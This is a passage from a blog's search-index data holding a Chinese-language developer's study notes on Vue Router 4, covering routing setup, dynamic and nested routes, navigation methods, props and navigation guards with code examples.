服務封包參數方法","uri":"/blog/posts/%E7%9C%8B-HTTP-%E5%92%8C-HTTPS-API-%E6%9C%8D%E5%8B%99%E5%B0%81%E5%8C%85%E5%8F%83%E6%95%B8%E6%96%B9%E6%B3%95/"},{"categories":["Vue"],"content":"這篇 Vue Router 4 學習筆記，大部份都是抄官方文件內容，有簡單實作小記，可參考 GIT 練習，算是自己學習重點筆記。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:0:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"安裝 Vue router 4(重點提醒!!注意幾點) npm install vue-router@4 設定 main.js import { createApp } from 'vue' import { createRouter, createWebHashHistory } from 'vue-router' import App from './App.vue' import Home from './components/Home.vue' import About from './components/About.vue' // 2. 定義一些路由 // 每個路由都需要映射到一個組件。 // 我們後面再討論嵌套路由。 const routes = [ { path: '/', component: Home }, { path: '/about', component: About }, ] // 3. 創建路由實例並傳遞 `routes` 配置 // 你可以在這裡輸入更多的配置，但我們在這裡 // 暫時保持簡單 const router = createRouter({ // 4. 內部提供了 history 模式的實現。為了簡單起見，我們在這裡使用 hash 模式。 history: createWebHashHistory(), routes, // `routes: routes` 的縮寫 }) createApp(App).use(router).mount('#app') 重點提醒: import { createRouter, createWebHashHistory } from ‘vue-router’ routes 宣告 router 宣告(使用 createRouter, createWebHashHistory) createApp use vue-router html \u003crouter-view\u003e 記得加上這個 HTML (重要!!!我很常忘記) App.vue \u003ctemplate\u003e \u003ch1\u003eHello App!\u003c/h1\u003e \u003cp\u003e \u003c!--使用 router-link 組件進行導航 --\u003e \u003c!--通過傳遞 `to` 來指定鏈接 --\u003e \u003c!--`\u003crouter-link\u003e` 將呈現一個帶有正確 `href` 屬性的 `\u003ca\u003e` 標籤--\u003e \u003crouter-link to=\"/\"\u003eGo to Home\u003c/router-link\u003e \u003crouter-link to=\"/about\"\u003eGo to About\u003c/router-link\u003e \u003c/p\u003e \u003c!-- 路由出口 --\u003e \u003c!-- 路由匹配到的組件將渲染在這裡 --\u003e \u003crouter-view\u003e\u003c/router-view\u003e \u003c/template\u003e \u003cscript setup\u003e import Home from './components/Home.vue' import About from './components/About.vue' import HelloWorld from './components/HelloWorld.vue' // This starter template is using Vue 3 experimental \u003cscript setup\u003e SFCs // Check out https://github.com/vuejs/rfcs/blob/script-setup-2/active-rfcs/0000-script-setup.md \u003c/script\u003e \u003cstyle\u003e #app { font-family: Avenir, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; margin-top: 60px; } \u003c/style\u003e 重點提醒 \u003crouter-link to=\"/\"\u003eGo to Home\u003c/router-link\u003e 超連結指定某路由 \u003crouter-view\u003e\u003c/router-view\u003e 路由顯示的Vue元件 GIT:8d7a44b6059b3caf6ad648056817af4c8ec9060c 要在 setup 函數中訪問路由，請調用 useRouter 或 useRoute 函數。我們將在 Composition API 中瞭解更多信息。 在整個文檔中，我們會經常使用 router 實例，請記住，this.$router 與直接使用通過 createRouter 創建的 router 實例完全相同。我們使用 this.$router 的原因是，我們不想在每個需要操作路由的組件中都導入路由。 引用一下官方這段，setup 函數可以用 useRouter 和 useRoute。 router 是指整個 router實例。 route 是指 routes某一個 route 設定。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:1:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"動態路由匹配 带参数的动态路由匹配 | Vue Router ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"帶參數動態路由 使用 $route.param 匹配模式 匹配路徑 $route.params /users/:username /users/eduardo { username: ’eduardo’ } /users/:username/posts/:postId /users/eduardo/posts/123 { username: ’eduardo’, postId: ‘123’ } GIT:https://github.com/malagege/vue-router-test/commit/b1afcbb8fe9240e4851a680db958fafc558b6dd9 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"響應路由參數的變化(重要) 取得資料就是 AJAX 可用這個方式取得，後面會講到。 export default { created() { this.$watch( () =\u003e this.$route.params, (toParams, previousParams) =\u003e { console.log('toParams',toParams,'previsousParams',previousParams); } ) }, } watch 跟 $watch 差別 $watch : 實體上的函數，使用此函數註冊監聽器。 watch : 實體上的屬性，此屬性設置的物件在實體建立時會叫用 $watch 註冊監聽器。 $watch 是註冊監聽器的函數，而 watch 是為了開發者方便在實體上設置監聽器而提供的，其實 watch 本身也是使用 $watch 註冊監聽器。 參考: 監聽器( watch ) | 勇者鬥 Vue 龍 vue中watch和vm.$watch方法的區別？ - SegmentFault 思否 使用 beforeRouteUpdate 導航守衛 // 使用 beforeRouteUpdate 導航守衛 async beforeRouteUpdate(to, from) { // 對路由變化做出響應... // this.userData = await fetchUser(to.params.id) console.log('to',to,'from',from); }, } 簡單說明，第一次進來不會觸發上面兩個 function ，但第二次就會了。 GIT: 9649555832b6732ed355f765b0047e733294f3a4 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"捕獲所有路由或 404 Not found 路由 const routes = [ // 將匹配所有內容並將其放在 `$route.params.pathMatch` 下 { path: '/:pathMatch(.*)*', name: 'NotFound', component: NotFound }, // 將匹配以 `/user-` 開頭的所有內容，並將其放在 `$route.params.afterUser` 下 { path: '/user-:afterUser(.*)', component: UserGeneric }, ] this.$router.push({ name: 'NotFound', params: { pathMatch: this.$route.path.split('/') }, }) 這邊我改變一下 export default { methods:{ test(){ console.log(this.$route.path.split('/')); this.$router.push({ name: 'NotFound', // :pathMatch 為 下面參數可以帶入 // http://localhost:3000/#/123/456 params: { pathMatch: ['123','456'] }, }) } } } GIT:ef8040a99c655c68c20b92e8aceb47f64b7403c7 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:2:3","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"路由的匹配語法 路由的匹配語法 | Vue Router 基本上就是用正規表達式設定路由。這邊就不簡單實作 const routes = [ // /:orderId -\u003e 僅匹配數字 { path: '/:orderId(\\\\d+)' }, // /:productName -\u003e 匹配其他任何內容 { path: '/:productName' }, ] ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:3:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"可重複的參數 const routes = [ // /:chapters -\u003e 匹配 /one, /one/two, /one/two/three, 等 { path: '/:chapters+' }, // /:chapters -\u003e 匹配 /, /one, /one/two, /one/two/three, 等 { path: '/:chapters*' }, ] router.resolve 組出 url // 給定 { path: '/:chapters*', name: 'chapters' }, router.resolve({ name: 'chapters', params: { chapters: [] } }).href // 產生 / router.resolve({ name: 'chapters', params: { chapters: ['a', 'b'] } }).href // 產生 /a/b // 給定 { path: '/:chapters+', name: 'chapters' }, router.resolve({ name: 'chapters', params: { chapters: [] } }).href // 拋出錯誤，因為 `chapters` 為空 +與* 的差別 const routes = [ // 僅匹配數字 // 匹配 /1, /1/2, 等 { path: '/:chapters(\\\\d+)+' }, // 匹配 /, /1, /1/2, 等 { path: '/:chapters(\\\\d+)*' }, ] ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:3:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"可選參數 請注意，* 在技術上也標誌著一個參數是可選的，但 ? 參數不能重複。 const routes = [ // 匹配 /users 和 /users/posva { path: '/users/:userId?' }, // 匹配 /users 和 /users/42 { path: '/users/:userId(\\\\d+)?' }, ] ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:3:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"嵌套路由(nested-routes) 兩個步驟 設定 router 的 children 屬性 const routes = [ { path: '/', component: Home }, { path: '/about', component: About }, // 動態段以冒號開始 { path: '/users/:id', component: User , children: [ { // 當 /user/:id/profile 匹配成功 // UserProfile 將被渲染到 User 的 \u003crouter-view\u003e 內部 path: 'profile', component: UserProfile, }, { // 當 /user/:id/posts 匹配成功 // UserPosts 將被渲染到 User 的 \u003crouter-view\u003e 內部 path: 'posts', component: UserPosts, }, ], }, 設定目標組件(父層) router-view \u003cdiv\u003e User {{ $route.params.id }} \u003cbr\u003e \u003cbutton v-on:click=\"test\"\u003e on test\u003c/button\u003e \u003crouter-view\u003e\u003c/router-view\u003e \u003c/div\u003e 連結: http://localhost:3000/#/users/1/profile GIT:a0ee324aefb696a91645c1258181979cd7c35277 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"設定嵌套路由首頁 const routes = [ { path: '/', component: Home }, { path: '/about', component: About }, // 動態段以冒號開始 { path: '/users/:id', component: User , children: [ // UserHome will be rendered inside User's \u003crouter-view\u003e // when /user/:id is matched // 當 /user/:id 匹配成功 // UserHome 將被渲染到 User 的 \u003crouter-view\u003e 內部 { path: '', component: UserHome }, 連結: http://localhost:3000/#/users/1/ GIT:1d362c35c2ad53966a8d1794e845f7a07fc5eafa 官方範例:Nested Views - Vue Router 4 examples - CodeSandbox ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:4:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"編程式導航(Navigation Guards) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"跳頁到不同路徑網址 原本標題「導航到不同的位置」，我覺得看不是很懂，看我改得比較白話，哈哈。 注意：在 Vue 實例中，你可以通過 $router 訪問路由實例。因此你可以調用 this.$router.push。 想要導航到不同的 URL，可以使用 router.push 方法。這個方法會向 history 棧添加一個新的記錄，所以，當用戶點擊瀏覽器後退按鈕時，會回到之前的 URL。 當你點擊 \u003crouter-link\u003e 時，內部會調用這個方法，所以點擊 \u003crouter-link :to=\"...\"\u003e 相當於調用 router.push(…) ： 聲明式 編程式 router.push(…) // 字符串路徑 router.push('/users/eduardo') // 帶有路徑的對象 router.push({ path: '/users/eduardo' }) // 命名的路由，並加上參數，讓路由建立 url router.push({ name: 'user', params: { username: 'eduardo' } }) // 帶查詢參數，結果是 /register?plan=private router.push({ path: '/register', query: { plan: 'private' } }) // 帶 hash，結果是 /about#team router.push({ path: '/about', hash: '#team' } 比較特別的是後面三個，用query和hash屬性前面沒帶過 稍微查了一下，這篇提到裡面提到使用this.$route.query.參數也可以抓到值 API Reference | Vue Router const username = 'eduardo' // 我們可以手動建立 url，但我們必須自己處理編碼 router.push(`/user/${username}`) // -\u003e /user/eduardo // 同樣 router.push({ path: `/user/${username}` }) // -\u003e /user/eduardo // 如果可能的話，使用 `name` 和 `params` 從自動 URL 編碼中獲益 router.push({ name: 'user', params: { username } }) // -\u003e /user/eduardo // `params` 不能與 `path` 一起使用 router.push({ path: '/user', params: { username } }) // -\u003e /user 我有嘗試使用參數帶中文，但沒有發現什麼問題 GIT:75bf26ebf64ec5c2c4dc6f5476e86bb517327e65 由於屬性 to 與 router.push 接受的對象種類相同，所以兩者的規則完全相同。 router.push 和所有其他導航方法都會返回一個 Promise，讓我們可以等到導航完成後才知道是成功還是失敗。我們將在 Navigation Handling 中詳細介紹。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"替換當前位置 它的作用類似於 router.push，唯一不同的是，它在導航時不會向 history 添加新記錄，正如它的名字所暗示的那樣——它取代了當前的條目。 聲明式 編程式 router.replace(…) router.push({ path: '/home', replace: true }) // 相當於 router.replace({ path: '/home' }) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"回前一頁、下一頁 該方法採用一個整數作為參數，表示在歷史堆棧中前進或後退多少步，類似於 window.history.go(n) // 向前移動一條記錄，與 router.forward() 相同 router.go(1) // 返回一條記錄，與router.back() 相同 router.go(-1) // 前進 3 條記錄 router.go(3) // 如果沒有那麼多記錄，靜默失敗 router.go(-100) router.go(100) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:5:3","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"命名路由 除了 path 之外，你還可以為任何路由提供 name。這有以下優點： 沒有硬編碼的 URL params 的自動編碼/解碼。 防止你在 url 中出現打字錯誤。 繞過路徑排序（如顯示一個） const routes = [ { path: '/user/:username', name: 'user', component: User } ] \u003crouter-link :to=\"{ name: 'user', params: { username: 'erina' }}\"\u003e User \u003c/router-link\u003e 與下面程式相同 router.push({ name: 'user', params: { username: 'erina' } } vue-router/app.js at dev · vuejs/vue-router ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:6:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"命名視圖 簡單來說，設定 router-view 沒設定 name 後，預設名稱會是default。這邊看範例比較快。 \u003crouter-view class=\"view left-sidebar\" name=\"LeftSidebar\"\u003e\u003c/router-view\u003e \u003crouter-view class=\"view main-content\"\u003e\u003c/router-view\u003e \u003crouter-view class=\"view right-sidebar\" name=\"RightSidebar\"\u003e\u003c/router-view\u003e const router = createRouter({ history: createWebHashHistory(), routes: [ { path: '/', components: { default: Home, // LeftSidebar: LeftSidebar 的縮寫 LeftSidebar, // 它們與 `\u003crouter-view\u003e` 上的 `name` 屬性匹配 RightSidebar, }, }, ], }) 官方範例:Named Views - Vue Router 4 examples - CodeSandbox ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"嵌套命名視圖 我覺得這部分看官方文件比較清楚。 命名視圖 | Vue Router 官方範例: Nested Named Views - Vue Router 4 examples - CodeSandbox ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:7:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"重新導向和别名 官方文件原翻譯: 重定向和别名 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"重新導向(redirect) /search/screens -\u003e /search?q=screens 跟後端 redirect 意思差不多 const routes = [{ path: '/home', redirect: '/' }] 也能指向一個 route 的名稱 const routes = [{ path: '/home', redirect: { name: 'homepage' } }] 動態導向(帶參數) const routes = [ { // /search/screens -\u003e /search?q=screens path: '/search/:searchText', redirect: to =\u003e { // 方法接收目標路由作為參數 // return 重定向的字符串路徑/路徑對象 return { path: '/search', query: { q: to.params.searchText } } }, }, { path: '/search', // ... }, ] 别名 / 參照 /home。 const routes = [{ path: '/', component: Homepage, alias: '/home' }] 通過別名，你可以自由地將 UI 結構映射到一個任意的 URL，而不受配置的嵌套結構的限制。**使別名以 / 開頭，以使嵌套路徑中的路徑成為絕對路徑。**你甚至可以將兩者結合起來，用一個數組提供多個別名： const routes = [ { path: '/users', component: UsersLayout, children: [ // 為這 3 個 URL 呈現 UserList // - /users // - /users/list // - /people { path: '', component: UserList, alias: ['/people', 'list'] }, ], }, ] SEO 需要注意的事情:Consolidate Duplicate URLs with Canonicals | Google Search Central ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:8:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"將 props 傳遞給路由組件(容易忘記?) const User = { template: '\u003cdiv\u003eUser {{ $route.params.id }}\u003c/div\u003e' } const routes = [{ path: '/user/:id', component: User }] 替換 const User = { props: ['id'], template: '\u003cdiv\u003eUser {{ id }}\u003c/div\u003e' } const routes = [{ path: '/user/:id', component: User, props: true }] 簡單來說 route 設定多了 props:true，prop也需要設定對應變數 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:9:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"Boolean mode 當 props 設置為 true 時，route.params 將被設置為組件的 props。 命名視圖 簡單來說，跟上面用法差不多。 const routes = [ { path: '/user/:id', components: { default: User, sidebar: Sidebar }, props: { default: true, sidebar: false } } ] ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:9:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"物件給值(固定給值) 這邊是固定給值 const routes = [ { path: '/promotion/from-newsletter', component: Promotion, props: { newsletterPopup: false } } ] ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:9:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"函式給值(重要?) const routes = [ { path: '/search', component: SearchUser, props: route =\u003e ({ query: route.query.q }) } ] 官方範例:vue-router/app.js at dev · vuejs/vue-router 這邊就不實戰，簡單做個結論，動態給值，可使用props,function 方式進去，固定方式可以用 object mode ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:9:3","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"歷史模式 都是Web 常見的兩種hash,html5 history api ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:10:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"hash import { createRouter, createWebHashHistory } from 'vue-router' const router = createRouter({ history: createWebHashHistory(), routes: [ //... ], }) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:10:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"HTML5 模式 用 createWebHistory() 创建 HTML5 模式，推荐使用这个模式： import { createRouter, createWebHistory } from 'vue-router' const router = createRouter({ history: createWebHistory(), routes: [ //... ], }) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:10:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"伺服器配置 不同的歷史模式 | Vue Router 官方竟然沒放 Traefik ，我自己爬文找一下。 我竟然犯蠢了…，Traefik 不是 Web Server，所以我應該是要改代理後面的Web Server。 參考:Nginx try_files to traefik ingressrout? - Traefik / Traefik v2 - Traefik Labs Community Forum Sorry, not clear. Nginx is a web server not just a proxy like Traefik, and Traefik does not have a feature similar to try_files simply because it’s not a web server. Also “not working” is not a very good problem description. How do you test, what results are you expecting and what are you observing instead? ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:10:3","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"導航守衛(Navigation Guards) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:0","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"全局前置守衛 const router = createRouter({ ... }) router.beforeEach((to, from) =\u003e { // ... // 返回 false 以取消導航 return false }) 當一個導航觸發時，全局前置守衛按照創建順序調用。守衛是異步解析執行，此時導航在所有守衛 resolve 完之前一直處於等待中。 這邊有去做個實作，第一次進去，to 和 from 都會有值，這邊設定一半機率會跳頁!!簡單來說，to 是要轉頁面，from 是來源頁，當回傳 false時候，會轉到 from 。所以這就是為什麼第一次進去，from ,to 都是一樣，不會卡住問題 router.beforeEach((to, from) =\u003e { console.log('beforeEach START') console.log('to',to) console.log('from',from) console.log('beforeEach END') if(Math.random()\u003e 0.5) return true // ... // 返回 false 以取消導航 return false }) 每個守衛方法接收兩個參數： to: 即將要進入的目標 用一種標準化的方式 from: 當前導航正要離開的路由 用一種標準化的方式 可以返回的值如下: false: 取消當前的導航。如果瀏覽器的 URL 改變了(可能是用戶手動或者瀏覽器後退按鈕)，那麼 URL 地址會重置到 from 路由對應的地址。 一個路由地址: 通過一個路由地址跳轉到一個不同的地址，就像你調用 router.push() 一樣，你可以設置諸如 replace: true 或 name: ‘home’ 之類的配置。當前的導航被中斷，然後進行一個新的導航，就和 from 一樣。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:1","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"錯誤監聽 如果遇到了意料之外的情況，可能會拋出一個 Error。這會取消導航並且調用 router.onError() 註冊過的回調。 如果什麼都沒有，undefined 或返回 true，則導航是有效的，並調用下一個導航守衛 router.beforeEach((to, from) =\u003e { console.log('beforeEach START') console.log('to',to) console.log('from',from) console.log('beforeEach END') a[2] if(Math.random()\u003e 0.5) return true // ... // 返回 false 以取消導航 return false }) router.onError((error,to,from)=\u003e{ console.log('Error START'); console.log('error',error); console.log('to', to); console.log('from', from); console.log('Error END') }) 可用 Promise工作方式 router.beforeEach(async (to, from) =\u003e { // canUserAccess() 返回 `true` 或 `false` return await canUserAccess(to) }) 可選的第三個參數 next 在之前的 Vue Router 版本中，也是可以使用 第三個參數 next 的。這是一個常見的錯誤來源，可以通過 RFC 來消除錯誤。然而，它仍然是被支持的，這意味著你可以向任何導航守衛傳遞第三個參數。在這種情況下，確保 next 在任何給定的導航守衛中都被嚴格調用一次。它可以出現多於一次，但是只能在所有的邏輯路徑都不重疊的情況下，否則鉤子永遠都不會被解析或報錯。這裡有一個在用戶未能驗證身份時重定向到/login的錯誤用例： // GOOD router.beforeEach((to, from, next) =\u003e { if (to.name !== 'Login' \u0026\u0026 !isAuthenticated) next({ name: 'Login' }) else next() }) 簡單來說，這邊簡單實作是否登入動作導向登入頁。next()裡面空值，會進去to頁面，假如有指定next裡面參數，會進去到指定頁面。 這邊我們看到，這邊沒有return ture/false，我很好奇我這邊return false會怎麼樣?結論，next()會執行跳頁動作，所以return true/false就沒有什麼意思。 router.beforeEach((to, from, next) =\u003e { if (to.name === 'about'){ next() }else{ next({ name: 'about' }) } // else next() return false }) ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:2","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"全局解析守衛 你可以用 router.beforeResolve 註冊一個全局守衛。這和 router.beforeEach 類似，因為它在 每次導航時都會觸發，但是確保在導航被確認之前，同時在所有組件內守衛和異步路由組件被解析之後，解析守衛就被正確調用。這裡有一個例子，確保用戶可以訪問自定義 meta 屬性 requiresCamera 的路由： router.beforeResolve(async to =\u003e { if (to.meta.requiresCamera) { try { await askForCameraPermission() } catch (error) { if (error instanceof NotAllowedError) { // ... 處理錯誤，然後取消導航 return false } else { // 意料之外的錯誤，取消導航並把錯誤傳給全局處理器 throw error } } } }) 這邊可以進行權限判斷。 ","date":"2021-06-27","objectID":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/:11:3","tags":["vue","vue router"],"title":" Vue Router 4 學習筆記","uri":"/blog/posts/Vue-Router-4-%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/"},{"categories":["Vue"],"content":"全局後置鉤子 router.afterEach((to, from) =\u003e { sendToAnalytics(to.fullPath) }) 或 router.afterEach((to, from, failure) =\u003e { if (!failure) sendToAnalytics(to.fullPath) }) 等待导航结果 | Vue Router 路由(route)獨享的守衛 const routes = [ { path: '/users/:id', component: UserDetails, beforeEnter: (to, from) =\u003e { // reject the navigation return false }, }, ] beforeEnter 守衛 只在進入路由時觸發，不會在 params、query 或 hash 改變時觸發。例如，從 /users/2 進入到 /users/3 或者從 /users/2#info 進入到 /users/2#projects。它們只有在 從一個不同的 路由導航時，才會被觸發。 你也可以將一個函數數組傳遞給 beforeEnter，這在為不同的路由重用守衛時很有用： function removeQueryParams(to) { if (Object.keys(to.query).length) return { path: to.path, query: {}, hash: to.hash } } function removeHash(to) { if (to.hash) return { path: to.path, query: to.query, hash: '' } } const routes = [ { path: '/users/:id', component: UserDetails, beforeEnter: [removeQueryParams, removeHash], }, { path: '/about', component: UserDetails, beforeEnter: [removeQueryParams], }, ] beforeEnter 這邊是設定在 route，可以帶路陣列方式。 組件內的守衛 可用的配置 